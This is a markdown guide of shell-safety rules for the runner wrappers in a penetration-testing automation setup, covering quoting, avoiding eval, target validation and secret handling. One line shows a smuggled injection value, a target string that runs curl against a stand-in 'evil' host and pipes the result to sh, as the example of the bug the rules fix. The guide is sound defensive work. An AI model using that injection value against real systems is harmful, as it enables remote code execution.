# Shell-safety rules for runner wrappers

Every wrapper under `runners/` follows these rules. They exist to close the
AutoPentestX/Guardian command-injection and secret-leak issues.

## Hard rules

1. **`set -eu`** at the top of every script (fail on error and on unset vars).
2. **Quote every expansion.** Always `"$VAR"`, never bare `$VAR`. This is what
   prevents word-splitting and glob/metacharacter injection from a target.
3. **No `eval`.** Argument parsing uses an explicit `while`/`case` loop.
4. **Pass untrusted values as positional arguments**, never interpolated into a
   command string. `python3 main.py -t "$TARGET"` — not `sh -c "... $TARGET"`.
5. **Re-validate the target** with `validate-target.mjs` before doing anything.
   The runner does not trust the portal or n8n.
6. **No auto-accept of authorization prompts.** Do not pipe `echo "yes"`.
   Authorization is an explicit `--approved true` gate (audited upstream); only
   then may a tool's own non-interactive flag (e.g. AutoPentestX `-y`) be used.
7. **Secrets via environment only.** Never accept an API key as a CLI argument
   (it would show up in `ps`), never write it to a config file, never echo it,
   never `cat` a log that may contain it to stdout.
8. **Build JSON with `node -e`** (values passed via env) rather than `printf`
   string-concatenation, so untrusted text cannot break the JSON or inject.
9. **Deterministic, scoped output paths** keyed by `scanJobId`.

## Why argv instead of a shell string

The old node ran:

```bash
echo "yes" | python3 main.py -t {{$json.target}} ...
```

`{{$json.target}}` was substituted into the shell command unquoted. A target of
`8.8.8.8; curl http://evil/x | sh` would execute. The wrapper instead receives
the target as `--target "$TARGET"`, validates it, and passes it to Python as a
single argv element — the shell never re-parses it.

## Validator contract

`node validate-target.mjs "<target>"`

* exit `0` → allowed; a JSON `{ "ok": true, ... }` is printed to **stderr**.
* exit non-zero → denied; a JSON `{ "ok": false, "code": "...", ... }` is printed
  to **stderr**. Wrappers surface this in their structured failure output.

Reads `NETRA_SCOPE_ALLOWLIST` / `SCAN_SCOPE_ALLOWLIST` (required),
`NETRA_SCOPE_DENYLIST`, `NETRA_MAX_TARGETS` (default 256),
`NETRA_ALLOW_PUBLIC_TARGETS` (default false).
